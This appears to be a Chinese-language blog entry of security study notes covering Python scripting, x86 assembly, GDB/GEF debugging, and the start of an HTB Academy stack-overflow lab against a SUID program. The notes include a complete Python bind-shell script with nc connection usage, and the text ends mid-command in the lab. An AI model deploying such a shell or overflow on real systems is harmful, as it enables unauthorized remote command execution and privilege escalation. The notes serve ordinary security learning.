<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>缓冲区溢出</title>
      <link href="/2024/09/27/overflow/"/>
      <url>/2024/09/27/overflow/</url>
      
        <content type="html"><![CDATA[<h2 id="python脚本基础">python脚本基础</h2><p>不多赘述语法</p><p>在 Python 脚本的第一行添加<a href="https://en.wikipedia.org/wiki/Shebang_(Unix)#Portability">shebang</a> ( <code>#!/usr/bin/env python3</code>)，可无需在在命令行开头输入python运行脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x welcome.py</span><br><span class="line">./welcome.py</span><br></pre></td></tr></table></figure><p><strong>库管理</strong></p><p>查看已安装库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip freeze</span><br></pre></td></tr></table></figure><p>将复制上述<code>freeze</code>输出并将其保存为需求文件，即为<code>requirements.txt</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install -r requirements.txt</span><br></pre></td></tr></table></figure><p><strong>click装饰器</strong></p><p>使脚本更灵活，在运行脚本时接受输入参数（<a href="https://click.palletsprojects.com/">官方文档</a>）</p><p>例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> click</span><br><span class="line"></span><br><span class="line"><span class="meta">@click.command()</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;--count&#x27;</span>, default=<span class="number">1</span>, <span class="built_in">help</span>=<span class="string">&#x27;Number of greetings.&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;--name&#x27;</span>, prompt=<span class="string">&#x27;Your name&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;The person to greet.&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>(<span class="params">count, name</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">        click.echo(<span class="string">&#x27;Hello %s!&#x27;</span> % name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    hello()</span><br><span class="line">    </span><br><span class="line"><span class="comment"># python click_test.py --name Birb</span></span><br></pre></td></tr></table></figure><p><strong>bind shell</strong></p><p>简单的bind shell脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> click</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_cmd</span>(<span class="params">cmd</span>):</span><br><span class="line">    output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> output.stdout</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_input</span>(<span class="params">client_socket</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        chunks = []</span><br><span class="line">        chunk = client_socket.recv(<span class="number">2048</span>)</span><br><span class="line">        chunks.append(chunk)</span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(chunk) != <span class="number">0</span> <span class="keyword">and</span> <span class="built_in">chr</span>(chunk[-<span class="number">1</span>]) != <span class="string">&#x27;\n&#x27;</span>:</span><br><span class="line">            chunk = client_socket.recv(<span class="number">2048</span>)</span><br><span class="line">            chunks.append(chunk)</span><br><span class="line">        cmd = (<span class="string">b&#x27;&#x27;</span>.join(chunks)).decode()[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> cmd.lower() == <span class="string">&#x27;exit&#x27;</span>:</span><br><span class="line">            client_socket.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        output = run_cmd(cmd)</span><br><span class="line">        client_socket.sendall(output)</span><br><span class="line"></span><br><span class="line"><span class="meta">@click.command()</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;--port&#x27;</span>, <span class="string">&#x27;-p&#x27;</span>, default=<span class="number">4444</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">port</span>):</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, port))</span><br><span class="line">    s.listen(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        client_socket, _ = s.accept()</span><br><span class="line">        t = Thread(target=handle_input, args=(client_socket, ))</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>用法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">target:</span><br><span class="line">python bindshell.py --port 4444</span><br><span class="line">attacker:</span><br><span class="line">nc 10.10.10.10 4444 -nv</span><br></pre></td></tr></table></figure><blockquote><p>1、库默认存储位置</p><p>Windows 10 <code>PYTHON_INSTALL_DIR\Lib\site-packages</code></p><p>Linux <code>/usr/lib/PYTHON_VERSION/dist-packages/</code></p><p>2、默认搜索路径：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="keyword">import</span> sys</span><br><span class="line">&gt;sys.path</span><br></pre></td></tr></table></figure><p>3、项目中建议使用虚拟环境管理库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;python3 -m venv [name]</span><br><span class="line">&gt;source [name]/bin/activate</span><br></pre></td></tr></table></figure></blockquote><h2 id="x86-汇编基础">x86 汇编基础</h2><h3 id="编译和调试">编译和调试</h3><p>例子：<code>helloWorld.s</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line"></span><br><span class="line">section .data</span><br><span class="line">    message db &quot;Hello HTB Academy!&quot;</span><br><span class="line">    length equ $-message ;代表message长度</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">_start:</span><br><span class="line">    mov rax, 1</span><br><span class="line">    mov rdi, 1</span><br><span class="line">    mov rsi, message</span><br><span class="line">    mov rdx, length</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rax, 60</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure><p>汇编代码由标签、指令、操作数组成</p><p><strong>编译</strong></p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf64 helloWorld.s</span><br></pre></td></tr></table></figure><blockquote><p><code>-f elf64</code>标志用于指示我们要汇编 64 位汇编代码。如果我们要汇编 32 位代码，则可以使用<code>-f elf</code>。</p></blockquote><p><strong>链接</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ld -o helloWorld helloWorld.o</span><br></pre></td></tr></table></figure><blockquote><p>如果我们要汇编 32 位二进制文件，则需要添加“ <code>-m elf_i386</code>”标志。</p></blockquote><p><strong>运行</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./helloWorld</span><br></pre></td></tr></table></figure><p>一键脚本，<code>-g</code>参数进入调试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">fileName=<span class="string">&quot;<span class="variable">$&#123;1%%.*&#125;</span>&quot;</span> <span class="comment"># remove .s extension</span></span><br><span class="line"></span><br><span class="line">nasm -f elf64 <span class="variable">$&#123;fileName&#125;</span><span class="string">&quot;.s&quot;</span></span><br><span class="line">ld <span class="variable">$&#123;fileName&#125;</span><span class="string">&quot;.o&quot;</span> -o <span class="variable">$&#123;fileName&#125;</span></span><br><span class="line">[ <span class="string">&quot;<span class="variable">$2</span>&quot;</span> == <span class="string">&quot;-g&quot;</span> ] &amp;&amp; gdb -q <span class="variable">$&#123;fileName&#125;</span> || ./<span class="variable">$&#123;fileName&#125;</span></span><br></pre></td></tr></table></figure><p><strong>反汇编</strong></p><p>该<code>objdump</code>工具，该工具会从文件中转储机器代码并解释每个十六进制代码的汇编指令。我们可以使用该<code>-D</code>标志反汇编二进制文件。</p><blockquote><p>使用标志<code>-M intel</code>，这样就<code>objdump</code>可以用我们正在使用的英特尔语法编写指令</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -M intel -d helloWorld</span><br></pre></td></tr></table></figure><blockquote><p>如果我们只想显示汇编代码，而不显示机器代码或地址，我们可以添加<code>--no-show-raw-insn --no-addresses</code>标志</p></blockquote><blockquote><p><code>objdump</code>已将第三条指令更改为<code>movabs</code>。这与<code>mov</code>相同，因此如果您需要重新组合代码，可以将其改回<code>mov</code>。</p></blockquote><p>标志<code>-d</code>只会反汇编<code>.text</code>这一部分。要转储任何字符串，我们可以使用该<code>-s</code>标志，并添加<code>-j .data</code>以仅检查该<code>.data</code>部分。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -sj .data helloWorld</span><br></pre></td></tr></table></figure><p><strong>调试</strong></p><p>安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install gdb</span><br></pre></td></tr></table></figure><p>gef插件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget -O ~/.gdbinit-gef.py -q https://gef.blah.cat/py</span><br><span class="line">echo source ~/.gdbinit-gef.py &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure><blockquote><p>若wget失败，手动复制即可</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -q ./helloWorld</span><br></pre></td></tr></table></figure><h3 id="gdb使用">GDB使用</h3><p><strong>info</strong></p><blockquote><p>如果我们想了解任何命令在<code>GDB</code>中的运行方式，我们可以使用该<code>help CMD</code>命令来获取其文档。例如，我们可以尝试执行<code>help info</code></p></blockquote><p>使用<code>info</code>命令来检查二进制文件中定义了哪些<code>functions</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gef➤  info functions</span><br><span class="line"></span><br><span class="line">All defined functions:</span><br><span class="line"></span><br><span class="line">Non-debugging symbols:</span><br><span class="line">0x0000000000401000  _start</span><br></pre></td></tr></table></figure><p>找到了我们的主要<code>_start</code>功能</p><p>使用<code>info variables</code>命令查看程序内所有可用的变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gef➤  info variables</span><br><span class="line"></span><br><span class="line">All defined variables:</span><br><span class="line"></span><br><span class="line">Non-debugging symbols:</span><br><span class="line">0x0000000000402000  message</span><br><span class="line">0x0000000000402012  __bss_start</span><br><span class="line">0x0000000000402012  _edata</span><br><span class="line">0x0000000000402018  _end</span><br></pre></td></tr></table></figure><p>我们找到了<code>message</code>，以及定义内存段的一些其他默认变量</p><p>查看特定函数内的指令，我们可以使用<code>disassemble</code>或<code>disas</code>命令以及函数名称</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gef➤  disas _start</span><br><span class="line"></span><br><span class="line">Dump of assembler code for function _start:</span><br><span class="line">   0x0000000000401000 &lt;+0&gt;:mov    eax,0x1</span><br><span class="line">   0x0000000000401005 &lt;+5&gt;:mov    edi,0x1</span><br><span class="line">   0x000000000040100a &lt;+10&gt;:movabs rsi,0x402000</span><br><span class="line">   0x0000000000401014 &lt;+20&gt;:mov    edx,0x12</span><br><span class="line">   0x0000000000401019 &lt;+25&gt;:syscall</span><br><span class="line">   0x000000000040101b &lt;+27&gt;:mov    eax,0x3c</span><br><span class="line">   0x0000000000401020 &lt;+32&gt;:mov    edi,0x0</span><br><span class="line">   0x0000000000401025 &lt;+37&gt;:syscall</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p><strong>调试</strong></p><p>大致分为四个功能，下断点，检查，步进，修改当前寄存器值</p><p><code>break</code></p><p>使用<code>break</code>或<code>b</code>命令以及要中断的地址或函数名称。例如，要跟踪程序运行的所有指令，让我们在<code>_start</code>函数处中断</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gef➤  b _start</span><br><span class="line"></span><br><span class="line">Breakpoint 1 at 0x401000</span><br></pre></td></tr></table></figure><p>为了启动我们的程序，我们可以使用<code>run</code>或<code>r</code>命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">gef➤  b _start</span><br><span class="line">Breakpoint 1 at 0x401000</span><br><span class="line">gef➤  r</span><br><span class="line">Starting program: ./helloWorld </span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x0000000000401000 in _start ()</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────── registers ────</span><br><span class="line">$rax   : 0x0               </span><br><span class="line">$rbx   : 0x0               </span><br><span class="line">$rcx   : 0x0               </span><br><span class="line">$rdx   : 0x0               </span><br><span class="line">$rsp   : 0x00007fffffffe310  →  0x0000000000000001</span><br><span class="line">$rbp   : 0x0               </span><br><span class="line">$rsi   : 0x0               </span><br><span class="line">$rdi   : 0x0               </span><br><span class="line">$rip   : 0x0000000000401000  →  &lt;_start+0&gt; mov eax, 0x1</span><br><span class="line">...SNIP...</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffe310│+0x0000: 0x0000000000000001 ← $rsp</span><br><span class="line">0x00007fffffffe318│+0x0008: 0x00007fffffffe5a0  →  &quot;./helloWorld&quot;</span><br><span class="line">...SNIP...</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">     0x400ffa                  add    BYTE PTR [rax], al</span><br><span class="line">     0x400ffc                  add    BYTE PTR [rax], al</span><br><span class="line">     0x400ffe                  add    BYTE PTR [rax], al</span><br><span class="line"> →   0x401000 &lt;_start+0&gt;       mov    eax, 0x1</span><br><span class="line">     0x401005 &lt;_start+5&gt;       mov    edi, 0x1</span><br><span class="line">     0x40100a &lt;_start+10&gt;      movabs rsi, 0x402000</span><br><span class="line">     0x401014 &lt;_start+20&gt;      mov    edx, 0x12</span><br><span class="line">     0x401019 &lt;_start+25&gt;      syscall </span><br><span class="line">     0x40101b &lt;_start+27&gt;      mov    eax, 0x3c</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#0] Id 1, Name: &quot;helloWorld&quot;, stopped 0x401000 in _start (), reason: BREAKPOINT</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0x401000 → _start()</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure><p>如果我们想在某个地址设置断点，例如<code>_start+10</code>，我们可以这样<code>b *_start+10</code>做<code>b *0x40100a</code></p><blockquote><p>程序运行后，如果我们设置另一个断点，例如<code>b *0x401005</code>，为了继续到该断点，我们应该使用<code>continue</code>或<code>c</code>命令。如果我们再次使用<code>run</code>或<code>r</code>，它将从头开始运行程序。这对于跳过循环很有用</p></blockquote><p>使用<code>info breakpoint</code>命令。我们也可以<code>disable</code>、<code>enable</code>或<code>delete</code>任何断点。此外，GDB 还支持设置条件断点，当满足特定条件时停止执行</p><p><code>Examine</code></p><p>手动检查任何地址或寄存器或检查任何其他地址或寄存器，我们可以使用<code>x</code>格式的命令<code>x/FMT ADDRESS</code>，正如<code>help x</code>所见。<code>ADDRESS</code>是我们要检查的地址或寄存器，而<code>FMT</code>是检查格式</p><p><code>FMT</code>分为</p><table><thead><tr><th><code>Count</code></th><th>我们要重复检查的次数</th><th>2、3、10</th></tr></thead><tbody><tr><td><code>Format</code></td><td>我们希望结果的表示格式</td><td><code>x(hex)</code>、<code>s(string)</code>、<code>i(instruction)</code></td></tr><tr><td><code>Size</code></td><td>我们要检查的内存大小</td><td><code>b(byte)</code>、<code>h(halfword)</code>、<code>w(word)</code>、<code>g(giant, 8 bytes，64-bits)</code></td></tr></tbody></table><p><strong>例</strong>：如果我们想检查接下来的四条指令，我们将必须检查寄存器<code>$rip</code>（它保存下一条指令的地址）,<code>4</code> for the <code>count</code>, <code>i</code> for the <code>format</code>, and <code>g</code> for the <code>size</code> (for 8-bytes or 64-bits)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/4ig $rip</span><br><span class="line"></span><br><span class="line">=&gt; 0x401000 &lt;_start&gt;:mov    eax,0x1</span><br><span class="line">   0x401005 &lt;_start+5&gt;:mov    edi,0x1</span><br><span class="line">   0x40100a &lt;_start+10&gt;:movabs rsi,0x402000</span><br><span class="line">   0x401014 &lt;_start+20&gt;:mov    edx,0x12</span><br></pre></td></tr></table></figure><p><strong>例</strong>：检查存储在特定内存地址的变量。我们知道我们的<code>message</code>变量存储在我们之前反汇编的<code>.data</code>地址部分<code>0x402000</code>，Count默认值为一无需指定，使用<code>s</code>格式以字符串格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/s 0x402000</span><br><span class="line"></span><br><span class="line">0x402000:&quot;Hello HTB Academy!&quot;</span><br></pre></td></tr></table></figure><p>最常见的检查格式是十六进制<code>x</code>。我们经常需要检查包含十六进制数据的地址和寄存器，例如内存地址、指令或二进制数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/wx 0x401000</span><br><span class="line"></span><br><span class="line">0x401000 &lt;_start&gt;:0x000001b8</span><br></pre></td></tr></table></figure><p>小端存储</p><p>任何时候我们都可以使用<code>registers</code>命令打印出所有寄存器的当前值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gef➤  registers</span><br><span class="line">$rax   : 0x0               </span><br><span class="line">$rbx   : 0x0               </span><br><span class="line">$rcx   : 0x0               </span><br><span class="line">$rdx   : 0x0               </span><br><span class="line">$rsp   : 0x00007fffffffe310  →  0x0000000000000001</span><br><span class="line">$rbp   : 0x0               </span><br><span class="line">$rsi   : 0x0               </span><br><span class="line">$rdi   : 0x0               </span><br><span class="line">$rip   : 0x0000000000401000  →  &lt;_start+0&gt; mov eax, 0x1</span><br></pre></td></tr></table></figure><p><code>step</code></p><p><code>stepi</code>或命令<code>si</code>将逐一执行汇编指令，这是调试时可能的最小步骤级别</p><p>我们可以<code>si</code>通过在命令后添加数字来重复该命令 <code>si 3 </code></p><p><code>step</code>或<code>s</code>命令将一直运行，直到退出当前函数</p><p><code>modify</code></p><p>要在 GDB 中修改值，我们可以使用<code>set</code>命令。但是，我们将使用<code>GEF</code>中的命令<code>patch</code>使此步骤更加容易</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gef➤  help patch</span><br><span class="line"></span><br><span class="line">Write specified values to the specified address.</span><br><span class="line">Syntax: patch (qword|dword|word|byte) LOCATION VALUES</span><br><span class="line">patch string LOCATION &quot;double-escaped string&quot;</span><br></pre></td></tr></table></figure><p>我们必须提供新值的<code>type/size</code>、要存储的<code>location</code>以及我们要使用的<code>value</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gef➤  break *0x401019</span><br><span class="line"></span><br><span class="line">Breakpoint 1 at 0x401019</span><br><span class="line">gef➤  r</span><br><span class="line">gef➤  patch string 0x402000 &quot;Patched!\\x0a&quot;</span><br><span class="line">gef➤  c</span><br><span class="line"></span><br><span class="line">Continuing.</span><br><span class="line">Patched!</span><br><span class="line"> Academy!</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gef➤  break *0x401019</span><br><span class="line"></span><br><span class="line">Breakpoint 1 at 0x401019</span><br><span class="line">gef➤  r</span><br><span class="line">gef➤  patch string 0x402000 &quot;Patched!\\x0a&quot;</span><br><span class="line">gef➤  set $rdx=0x9</span><br><span class="line">gef➤  c</span><br><span class="line"></span><br><span class="line">Continuing.</span><br><span class="line">Patched!</span><br></pre></td></tr></table></figure><h3 id="语法">语法</h3><p><strong>只记些课上没学过的</strong></p><p>数据移动</p><p><code>lea</code>:加载指向值的地址lea rax, [rsp+5]<code>-&gt;</code>rax = rsp+5</p><blockquote><p><code>mov rax, rsp</code>和<code>lea rax, [rsp]</code>都会执行相同的操作，但是，如果我们想加载一个带有偏移量的指针（即，距离变量或地址几个地址），我们应该使用<code>lea</code>，如<code>lea rax, [rsp+10]</code></p></blockquote><p><code>xchg</code>:在两个寄存器或地址之间交换数据xchg rax, rbx<code>-&gt;</code>rax = rbx, rbx = rax</p><blockquote><p>在汇编中，移动数据不会影响源操作数。因此，我们可以将其视为<code>mov</code>一个<code>copy</code>函数，而不是实际的移动。</p></blockquote><blockquote><p>利用更短的寄存器更加高效</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf64 fib.s &amp;&amp; objdump -M intel -d fib.o</span><br><span class="line">0000000000000000 &lt;_start&gt;:</span><br><span class="line">   0:b8 00 00 00 00       mov    eax,0x0</span><br><span class="line">   5:bb 01 00 00 00       mov    ebx,0x1</span><br><span class="line">   a:b3 01                mov    bl,0x1</span><br></pre></td></tr></table></figure></blockquote><h2 id="示例">示例</h2><p>简单无保护栈溢出，环境在HTBA</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">We were able to gain SSH access to a Linux machine whose password was reused by another machine during our penetration test.</span><br><span class="line">我们能够获得对一台Linux机器的SSH访问，在我们的渗透测试期间，另一台机器重用了该机器的密码。</span><br><span class="line"></span><br><span class="line">On this machine, we have a standard user &quot;htb-student&quot; who can leave a message to the administrator using a self-written program called &quot;leave_msg.&quot; Since the target company pays a lot of attention to defense from outside their network, and the administrator&#x27;s appearance showed high self-confidence, it may indicate that local security was disregarded.</span><br><span class="line">在这台机器上，我们有一个标准用户“htb-student”，他可以使用一个名为“leave_msg”的自编程序向管理员留言。“由于目标公司非常注重网络外部的防御，而且管理员的表现出高度的自信，这可能表明他们忽视了本地安全。</span><br><span class="line"></span><br><span class="line">After our research, we found out that these messages are stored in &quot;/htb-student/msg.txt,&quot; which is binary owned by the user root, and the SUID bit is set.</span><br><span class="line">经过我们的研究，我们发现这些消息存储在“/htb-student/msg.txt”中，这是用户root拥有的二进制文件，并且设置了SUID位。</span><br><span class="line"></span><br><span class="line">Examine the program and find out if it is vulnerable to a Stack-Based Buffer Overflow. If you have found the vulnerability, then use it to read the file &quot;/root/flag.txt&quot; placed on the system as proof.</span><br><span class="line">检查程序并找出它是否容易受到基于堆栈的缓冲区溢出的攻击。如果您发现了漏洞，请使用它来读取放置在系统上的文件“/root/flag.txt”作为证据。</span><br></pre></td></tr></table></figure><p>查看程序类型及功能</p><p><img src="https://s2.loli.net/2024/12/17/lJc4quo7XD9CObf.png" alt="3bcda70bd811270dde99815a8197b57d"></p><p><img src="https://s2.loli.net/2024/12/17/vMhe5Xaqr3G1YwP.png" alt="ff6c1b3f403621f56e6ac466085ac2c0"></p><p>用gdb调试，测出偏移在200~2100之间，EIP被覆盖为0x55555555</p><p><img src="https://s2.loli.net/2024/12/17/E9qIH35lUfcgYDb.png" alt="c20d422039b8941a9479921e188d35c9"></p><p>使用脚本生成并检测出精准偏移量</p><p><img src="https://s2.loli.net/2024/12/17/pfcKq568x7k2gFJ.png" alt="b9aa319b1ef79102b301fbac590d5607"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run $(python -c &quot;print 